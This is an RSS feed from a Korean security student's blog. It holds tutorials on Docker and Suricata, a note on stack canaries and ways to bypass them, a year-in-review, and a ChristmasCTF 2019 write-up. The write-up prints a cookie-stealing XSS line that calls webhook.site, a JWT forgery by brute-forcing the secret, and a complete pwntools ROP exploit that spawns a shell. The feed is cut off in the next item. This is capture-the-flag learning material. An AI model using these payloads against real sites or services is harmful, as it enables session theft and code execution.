<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>JHYEON BLOG</title>
    <link>https://blog.jhyeon.dev/</link>
    
    <atom:link href="https://blog.jhyeon.dev/rss2.xml" rel="self" type="application/rss+xml"/>
    
    <description>정동현(JHYEON BLOG)</description>
    <pubDate>Sun, 17 Jan 2021 10:17:21 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>2021년 IT/보안 분야 전망/동향 자료</title>
      <link>https://blog.jhyeon.dev/2021/01/12/newit-210112/</link>
      <guid>https://blog.jhyeon.dev/2021/01/12/newit-210112/</guid>
      <pubDate>Mon, 11 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;해당 포스트는 노션으로 이전되었습니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53&quot;&gt;https://www.notion.so/jhyeon</description>
        
      
      
      
      <content:encoded><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53">https://www.notion.so/jhyeon/2021-IT-6c25400797494e7f9c49640675cf6d53</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%A0%95%EB%B3%B4%EB%B3%B4%EC%95%88/">정보보안</category>
      
      <category domain="https://blog.jhyeon.dev/tags/%EC%B5%9C%EC%8B%A0%EB%8F%99%ED%96%A5/">최신동향</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/12/newit-210112/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Ubuntu 20.04 Docker Installation</title>
      <link>https://blog.jhyeon.dev/2021/01/08/docker-install-210108/</link>
      <guid>https://blog.jhyeon.dev/2021/01/08/docker-install-210108/</guid>
      <pubDate>Thu, 07 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Step-1&quot;&gt;&lt;a href=&quot;#Step-1&quot; class=&quot;headerlink&quot; title=&quot;Step 1&quot;&gt;&lt;/a&gt;Step 1&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;우분투 패키지 업데이트를 진행합니다.&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&quot;h</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Step-1"><a href="#Step-1" class="headerlink" title="Step 1"></a>Step 1</h3><ul><li>우분투 패키지 업데이트를 진행합니다.</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><h3 id="Step-2"><a href="#Step-2" class="headerlink" title="Step 2"></a>Step 2</h3><ul><li>도커 필수 라이브러리를 설치합니다.</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common</span><br></pre></td></tr></table></figure><h3 id="Step-3"><a href="#Step-3" class="headerlink" title="Step 3"></a>Step 3</h3><ul><li>GPG KEY 등록</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -</span><br></pre></td></tr></table></figure><h3 id="Step-4"><a href="#Step-4" class="headerlink" title="Step 4"></a>Step 4</h3><ul><li>Repositry 생성</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository \</span><br><span class="line"><span class="string">&quot;deb [arch=amd64] https://download.docker.com/linux/ubuntu \</span></span><br><span class="line"><span class="string"><span class="subst">$(lsb_release -cs)</span> \</span></span><br><span class="line"><span class="string">stable&quot;</span></span><br></pre></td></tr></table></figure><h3 id="Step-5"><a href="#Step-5" class="headerlink" title="Step 5"></a>Step 5</h3><ul><li>도커 설치</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install docker</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Docker/">Docker</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Ubuntu/">Ubuntu</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/08/docker-install-210108/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Suricata 설치 &amp; 기초</title>
      <link>https://blog.jhyeon.dev/2021/01/08/suricata-210108/</link>
      <guid>https://blog.jhyeon.dev/2021/01/08/suricata-210108/</guid>
      <pubDate>Thu, 07 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Suricata란&quot;&gt;&lt;a href=&quot;#Suricata란&quot; class=&quot;headerlink&quot; title=&quot;Suricata란?&quot;&gt;&lt;/a&gt;Suricata란?&lt;/h3&gt;&lt;p&gt;IDS(Intrusion Detection System) 시스템으로, 실</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Suricata란"><a href="#Suricata란" class="headerlink" title="Suricata란?"></a>Suricata란?</h3><p>IDS(Intrusion Detection System) 시스템으로, 실시간 IDS, IPS, NSM(Network Security Monitoring) 및 pcap 캡처를 지원한다.</p><h3 id="Suricata-Installation"><a href="#Suricata-Installation" class="headerlink" title="Suricata Installation"></a>Suricata Installation</h3><p>아래 설치 가이드는 우분투 20.04 환경에 맞는 설치 방법이다. 18.04는 아마 “sudo apt install suricata”로도 설치가 가능할 것이다.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install software-properties-common</span><br><span class="line">sudo add-apt-repository ppa:oisf/suricata-stable</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install suricata</span><br></pre></td></tr></table></figure><h3 id="Suricata-기본-룰-셋-다운로드"><a href="#Suricata-기본-룰-셋-다운로드" class="headerlink" title="Suricata 기본 룰 셋 다운로드"></a>Suricata 기본 룰 셋 다운로드</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo suricata-update</span><br><span class="line">sudo systemctl restart suricata</span><br></pre></td></tr></table></figure><h3 id="테스트-룰-셋"><a href="#테스트-룰-셋" class="headerlink" title="테스트 룰 셋"></a>테스트 룰 셋</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert tcp any any -&gt; any 80 (msg:<span class="string">&quot;Connection to sites.com&quot;</span>; content:<span class="string">&quot;sites.com&quot;</span>; sid:1001; rev:1;)</span><br></pre></td></tr></table></figure><p>위와 같이 테스트 룰 셋을 짜고 저장하면 80포트로 tcp통신하는 sites.com에 대한 패킷을 로그에 찍을 수 있다.</p><p>로그 파일은 “/var/log/suricata/fast.log”에서 볼 수 있고 tail 명령어로 실시간으로 찍어볼 수도 있다.</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Suricata/">Suricata</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Network/">Network</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/08/suricata-210108/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Memory Mitigation - Canary</title>
      <link>https://blog.jhyeon.dev/2021/01/02/mitigation-210102/</link>
      <guid>https://blog.jhyeon.dev/2021/01/02/mitigation-210102/</guid>
      <pubDate>Fri, 01 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;Canary-개념&quot;&gt;&lt;a href=&quot;#Canary-개념&quot; class=&quot;headerlink&quot; title=&quot;Canary 개념&quot;&gt;&lt;/a&gt;Canary 개념&lt;/h3&gt;&lt;p&gt;메모리 보호 기법(Memory Protection)의 일부에 해당하고, 일반</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="Canary-개념"><a href="#Canary-개념" class="headerlink" title="Canary 개념"></a>Canary 개념</h3><p>메모리 보호 기법(Memory Protection)의 일부에 해당하고, 일반적으로 버퍼 오버플로우(Buffer Overflow) 공격을 수행할 때, SFP(Stack Frame Pointer), RET(Return Address)를 덮어서 공격자가 원하는 흐름을 만들어 줄 수 있는데, 이 때 메모리가 덮어씌워 지는 것을 보호하기 위해서 스택에 할당되는 변수와, SFP(Stack Frame Pointer), RET(Return Address) 사이에서 특정한 값을 추가해서 메모리 변조의 유무를 판단하는 것의 메모리 보호 기법입니다.</p><h3 id="Canary-종류와-우회-방법"><a href="#Canary-종류와-우회-방법" class="headerlink" title="Canary 종류와 우회 방법"></a>Canary 종류와 우회 방법</h3><p>Canary 종류에는 3가지로 분류 해볼 수 있습니다.</p><ol><li>Terminator Canaries</li></ol><ul><li>Canary 값을 문자열의 끝을 나타내는 문자를 이용해서 생성하는 방식</li></ul><ol start="2"><li>Random Canaries</li></ol><ul><li>Canary 값을 랜덤하게 생성 하며, 프로그램 초기 설정 시 전역 변수에 저장</li></ul><ol start="3"><li>Random XOR Canaries</li></ol><ul><li>Canary 값을 모든 제어 데이터 또는 일부를 사용하여 XOR-Scramble 하여 생성</li></ul><h3 id="Canary-Bypassing"><a href="#Canary-Bypassing" class="headerlink" title="Canary Bypassing?"></a>Canary Bypassing?</h3><ol><li><p>Brute-Force<br>Canary 값은 4byte인데 이 값에서 1byte씩 Brute-Force를 수행하면 Canary 값을 알아낼 수 있습니다. 우선 버퍼의 값을 모두 채운다음에 오는 4byte(canary) 값에 대해서 1byte씩 덮으면서 값을 찾아낼 수 있습니다.<br>0x00 ~ 0xFF(256) 가지의 범위를 가지고 돌려보면 됩니다.</p></li><li><p>Recv, Strncpy<br>recv와 strncpy 함수는 문자열을 입력 받을 때 NULL 문자가 들어가지 않습니다. 이 점을 이용해서 버퍼가 printf 된다면 버퍼를 채워서 canary값을 출력하게 할 수 있습니다.</p></li><li><p>Canary Routine Leak<br>Canary를 생성하는 루틴이 노출될 경우 역 연산을 통해서 Canary 값을 알아낼 수 있습니다.</p></li></ol><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><p><a href="https://www.notion.so/jhyeon/Memory-Mitigation-Canary-c00cbfe3a8594b3398138fcf2adb7796">https://www.notion.so/jhyeon/Memory-Mitigation-Canary-c00cbfe3a8594b3398138fcf2adb7796</a></p></li><li><p><a href="https://koharinn.tistory.com/49">https://koharinn.tistory.com/49</a></p></li><li><p><a href="https://xerxes-break.tistory.com/285">https://xerxes-break.tistory.com/285</a></p></li></ul>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Linux/">Linux</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Canary/">Canary</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Memory-Mitigation/">Memory Mitigation</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/02/mitigation-210102/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>2020년 정리 &amp; 2021년 계획</title>
      <link>https://blog.jhyeon.dev/2021/01/02/newyear-210102/</link>
      <guid>https://blog.jhyeon.dev/2021/01/02/newyear-210102/</guid>
      <pubDate>Fri, 01 Jan 2021 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h2 id=&quot;2020-한-해를-돌아보며&quot;&gt;&lt;a href=&quot;#2020-한-해를-돌아보며&quot; class=&quot;headerlink&quot; title=&quot;2020 한 해를 돌아보며&quot;&gt;&lt;/a&gt;2020 한 해를 돌아보며&lt;/h2&gt;&lt;h3 id=&quot;2020-01-전공-동아리-회장</description>
        
      
      
      
      <content:encoded><![CDATA[<h2 id="2020-한-해를-돌아보며"><a href="#2020-한-해를-돌아보며" class="headerlink" title="2020 한 해를 돌아보며"></a>2020 한 해를 돌아보며</h2><h3 id="2020-01-전공-동아리-회장"><a href="#2020-01-전공-동아리-회장" class="headerlink" title="2020.01 [전공 동아리 회장]"></a>2020.01 [전공 동아리 회장]</h3><p>2020년을 시작하면서 학교에 입학할 시기부터 활동 해왔던 “해킹 &amp; 보안 동아리인, B@ngsiri 회장을 맡게 되었다.</p><p>회장 후보로 나갈 때 다짐했던 것이 기존의 스터디, 세미나, 교육 같은 부분에 있어서 개선을 하고 동아리에 도움이 되는 것들이 있다면</p><p>많이 끌어와서 동아리원들에게 많은 도움이 되었으면 하는게 회장 공약이였고, 내 다짐이기도 했다.</p><p>그렇게 회장에 당선되고 첫 시작으로 KUCIS(대학정보보호동아리연합회) 신청을 시작으로 여러 교육작인 부분이나 세미나들을 알아 보면서</p><p>동아리원들에게 공지하고 하면서 한달 두달 보내왔던 것 같다.</p><p>이제 3월이 되고부터는 본격적으로 동아리 홍보에 나서면서 학과에 들어오는 신입생들에 대한 모집을 시작했다.</p><p>이번년 초에 코로나19가 확산되면서 사실 오프라인 자리에서는 신입생들을 직접 보면서 홍보를 할 수 없었고 같이 만나서 회식을 하거나 이런 자리도 사실 불가능 했다.</p><p>그래서 결국 모집에 있어서는 100% 비대면으로 진행을 했고, 이런 문제를 처음 겪다보니 온라인으로 행사를 준비하는 것이 되게 많이 힘들었던 것 같다.</p><p>기존에는 오프라인 모임을 가져서 동아리 홍보도 하고, 후배들이 선배들에게 궁금한 것도 묻고 서로 친해지는 자리가 있었는데 올해는 그런게 없었다..</p><p>그렇지만 어떻게 진행은 했기에 신입생도 모집하고 했지만 그 다음이 항상 문제였다.. 오프라인으로 진행될 행사들이 다 온라인으로 전환되거나 취소되면서,</p><p>단도직입적으로 말하면 기존 동아리원들이나 신입생들에게 챙겨줄 수 있는게 많이 없었다. 그래서 지난 부분들 돌아보면 이런게 가장 미안하면서도 좀 아쉬웠던 부분으로 남았다.</p><p>결코 회장이라는 자리가 확실히 부담감이 있고 무겁게 느껴졌지만 옆에서 같이 도와주는 운영진들이 있었기에 버틸 수 있지 않았나 싶었다..</p><h3 id="2020-06-BOB-9기-합격"><a href="#2020-06-BOB-9기-합격" class="headerlink" title="2020.06 [BOB 9기 합격]"></a>2020.06 [BOB 9기 합격]</h3><p>금년 5월부터 준비하던 BOB(이하, best of the best 9th) 교육생으로 최종 합격을 하였다.</p><p>서류 접수부터 필기 시험 면접 준비까지 작년처럼 생생한 기억이 들었고 올해는 꼭 붙겠다는 마인드 하나로 되게 열심히 준비했었던 것 같다.</p><p>(일반 생활 시간 빼면 거의 BOB 준비에 투자할 만큼 열정을 쏟아 부었지..)</p><p>최종 합격 이후 7월부터 이제 본격적인 교육생 신분으로 최고 정보보안전문가인 멘토님들에게 지도를 받고 9월에는 사람들끼리 팀을 모아 하나의 프로젝트를 하는 기간이였다.</p><p>7-8월 교육때 거의 밥먹는 것도 포기하면서 하루 10-15시간 교육을 들어서 그런지 하루가 어떻게 지나갔는지도 모르겠다. (이 때 진짜 죽을뻔..)</p><p>그렇게 두달이 순식간에 지나가고 9월이 되면서 프로젝트 준비에 한창이였는데 이 때가 가장 고민이 많았다. 왜냐하면 주제를 선정하는데도 어려움이 있었고,</p><p>우리팀을 맡아서 지도 해주실 멘토님들도 섭외를 해야했기에.. 그래도 멋진 멘토님들을 구해서 함께 할 수 있어서 정말 좋았다.</p><p>같은 팀원으로써도 열심히 해준 팀원들에게도 감사하다는 인사 올립니다!</p><p>어쩌다보니 벌써 새해 1월이고 이제 수료까지 3개월밖에 남지 않았다는 것에 아쉬움이 많이 남고있지만 남은 기간 화이팅 해볼 예정입니다!</p><h3 id="2020-09-해킹-보안-연구-데몬팀-합격"><a href="#2020-09-해킹-보안-연구-데몬팀-합격" class="headerlink" title="2020.09 [해킹/보안 연구 데몬팀 합격]"></a>2020.09 [해킹/보안 연구 데몬팀 합격]</h3><p>개인적으로 들어가고 싶었던 해킹팀에 올해 지원을 해서 합격을 하였다.</p><p>준비하는 기간동안 역량을 테스트하는 과제가 주어졌었고 그 과제를 하나하나 해나가면서 열심히 준비했다.</p><p>(지원 기간동안 BOB랑 많이 겹쳐서 못한 과제도 많아서 불안했던 건 사실…)</p><p>결과로 데몬팀에 최종 합격할 수 있었다는 메일을 받아볼 수 있었고, 뿌듯함과 동시에 열심히 해야겠다는 생각도 많이 들었다.</p><h3 id="앞으로의-계획"><a href="#앞으로의-계획" class="headerlink" title="앞으로의 계획"></a>앞으로의 계획</h3><ol><li><p>취업</p></li><li><p>자격증 취득 &amp;&amp; 개인 공부</p></li><li><p>건강(헬스 등..)</p></li></ol><p>큰 분류로 3개 나눠봤다우선 순위이자 계획이고 하나하나 열심히 준비해서 2021년에는 좀 더 성실한 사람이 되야겠다.</p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Memo/">Memo</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/%ED%9A%8C%EA%B3%A0/">회고</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/02/newyear-210102/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>시스템 OS 개념 및 기초</title>
      <link>https://blog.jhyeon.dev/2021/01/01/systemos-210101/</link>
      <guid>https://blog.jhyeon.dev/2021/01/01/systemos-210101/</guid>
      <pubDate>Thu, 31 Dec 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;해당 포스트는 노션으로 이전되었습니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/OS-Basic-8ab6955b2060478fa2a7846d128f7490&quot;&gt;https://www.notion.so/jhyeo</description>
        
      
      
      
      <content:encoded><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/OS-Basic-8ab6955b2060478fa2a7846d128f7490">https://www.notion.so/jhyeon/OS-Basic-8ab6955b2060478fa2a7846d128f7490</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/System/">System</category>
      
      <category domain="https://blog.jhyeon.dev/tags/OS/">OS</category>
      
      <category domain="https://blog.jhyeon.dev/tags/syscall/">syscall</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/01/systemos-210101/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>웹 해킹 기법 기초</title>
      <link>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/</link>
      <guid>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/</guid>
      <pubDate>Thu, 31 Dec 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;해당 포스트는 노션으로 이전되었습니다.&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0&quot;&gt;https://www.notion</description>
        
      
      
      
      <content:encoded><![CDATA[<p>해당 포스트는 노션으로 이전되었습니다.</p><p><a href="https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0">https://www.notion.so/jhyeon/Web-Hacking-Basic-1b7c7cb3dfe44feeae9e48dc17486ff0</a></p>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/Docx/">Docx</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Web-Hacking/">Web Hacking</category>
      
      
      <comments>https://blog.jhyeon.dev/2021/01/01/webhacking-210101/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>ChristmasCTF 2019 Write up</title>
      <link>https://blog.jhyeon.dev/2020/12/26/christmasctf-201226/</link>
      <guid>https://blog.jhyeon.dev/2020/12/26/christmasctf-201226/</guid>
      <pubDate>Fri, 25 Dec 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;h3 id=&quot;1-Web-watermelon&quot;&gt;&lt;a href=&quot;#1-Web-watermelon&quot; class=&quot;headerlink&quot; title=&quot;1. [Web] watermelon&quot;&gt;&lt;/a&gt;1. [Web] watermelon&lt;/h3&gt;&lt;p&gt;이 문제는 언인</description>
        
      
      
      
      <content:encoded><![CDATA[<h3 id="1-Web-watermelon"><a href="#1-Web-watermelon" class="headerlink" title="1. [Web] watermelon"></a>1. [Web] watermelon</h3><p>이 문제는 언인텐 풀이로 푼 것 같다. 문제 내에서 로그인 계정 중</p><p>admin 계정에 대해서</p><p>비밀번호가 admin 과 같이 세팅되어 있음을 알 수 있었고,</p><p>이를 통해 로그인 하여 플래그를 얻어낼 수 있었다.</p><h3 id="2-Web-JWT"><a href="#2-Web-JWT" class="headerlink" title="2. [Web] JWT"></a>2. [Web] JWT</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jwt: &#123;</span><br><span class="line">    bruth: &#123;</span><br><span class="line">      key: <span class="string">&#x27;********&#x27;</span>, <span class="comment">// 0~9, 8 length</span></span><br><span class="line">      options: &#123;</span><br><span class="line">        issuer: <span class="string">&#x27;c2w2m2&#x27;</span>,</span><br><span class="line">        expiresIn: <span class="string">&#x27;1d&#x27;</span>,</span><br><span class="line">        algorithm: <span class="string">&#x27;HS256&#x27;</span>,</span><br><span class="line">      &#125;</span><br><span class="line"> &#125;;</span><br></pre></td></tr></table></figure><p>해당 문제는 PHP JWT TOKEN 를 사용하는 문제이다.</p><p>config.js 에서 위와 같은 내용을 확인할 수 있었고</p><p>결론적으로 secret key를 브포해서 찾아내야 하는 것이였다.</p><p>그래서 해당 범위 내 숫자로 구성해서 브포를 돌려서 토큰의 secret key를 얻었고,</p><p>payload 부분에 있는 is_admin 항목을 true로 변조한 뒤 다시 인코딩하여 쿠키를 바꿔줌으로써 플래그를 얻었다.</p><ul><li>참고 : john the ripeer(<a href="https://www.openwall.com/john/">https://www.openwall.com/john/</a>)</li></ul><h3 id="3-Web-CSRF"><a href="#3-Web-CSRF" class="headerlink" title="3. [Web] CSRF"></a>3. [Web] CSRF</h3><p>해당 문제는 CSRF(Cross-site-Request-Forgery) 취약점을 사용한 문제이다.</p><p>문제에 보면 게시글을 쓸 수 있는 공간이 있고, 해당 로직을 처리하는 부분의 코드를 분석했을 때 다음과 같은 사실을 알 수 있다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (board.content.match(<span class="regexp">/script|img|on/i</span>)) <span class="keyword">return</span> res.send(&#123; <span class="attr">code</span>: <span class="number">400</span> &#125;);</span><br></pre></td></tr></table></figure><p>무려 내용 작성에 대해서만 필터링을 걸고 제목에는 없다.. 그래서 이를 이용해서 제목에 페이로드를 넣었다.</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">location.href=<span class="string">&#x27;https://webhook.site~&#x27;</span> + <span class="built_in">document</span>.cookie;</span><br></pre></td></tr></table></figure><h3 id="4-Pwn-Solo-test"><a href="#4-Pwn-Solo-test" class="headerlink" title="4. [Pwn] Solo test"></a>4. [Pwn] Solo test</h3><p>ROP 기법을 이용해서 풀면 된다.</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./solo_test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./solo_test&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc227.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pr = <span class="number">0x0000000000400b83</span></span><br><span class="line">ret = <span class="number">0x00000000004005f1</span></span><br><span class="line"></span><br><span class="line">puts_plt = e.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = e.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">solo = e.symbols[<span class="string">&#x27;solo&#x27;</span>]</span><br><span class="line"></span><br><span class="line">puts_offset = libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_offset = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binsh_offset = <span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;Me&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;No&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;CTF&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;Never&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">&#x27;No&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">88</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(puts_got)</span><br><span class="line">payload += p64(puts_plt)</span><br><span class="line">payload += p64(solo)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;--&gt; &#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">libc_base = puts_addr - puts_offset</span><br><span class="line">system_addr = libc_base + system_offset</span><br><span class="line">binsh_addr = libc_base + binsh_offset</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">88</span></span><br><span class="line">payload += p64(pr)</span><br><span class="line">payload += p64(binsh_addr)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(system_addr)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;--&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      <category domain="https://blog.jhyeon.dev/categories/CTF/">CTF</category>
      
      
      <category domain="https://blog.jhyeon.dev/tags/Web/">Web</category>
      
      <category domain="https://blog.jhyeon.dev/tags/Pwnable/">Pwnable</category>
      
      <category domain="https://blog.jhyeon.dev/tags/ChristmasCTF2019/">ChristmasCTF2019</category>
      
      
      <comments>https://blog.jhyeon.dev/2020/12/26/christmasctf-201226/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>BISC CTF 2020(oldschool) write up</title>
      <link>https://blog.jhyeon.dev/2020/11/21/bob-bisc-201129/</link>
      <guid>https://blog.jhyeon.dev/2020/11/21/bob-bisc-201129/</guid>
      <pubDate>Fri, 20 Nov 2020 15:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;사실 풀고나니 꽤나 쉬웠던 것 같은 문제인데, 요즘 시스템쪽을 하는둥 마는둥 하다보니 익스코드 짜는데&lt;/p&gt;
&lt;p&gt;오래 걸려버려서 대회 중에는 인증을 못해봤었다.. (틈틈히 챙겨야 할듯)&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.noti</description>
        
      
      
      
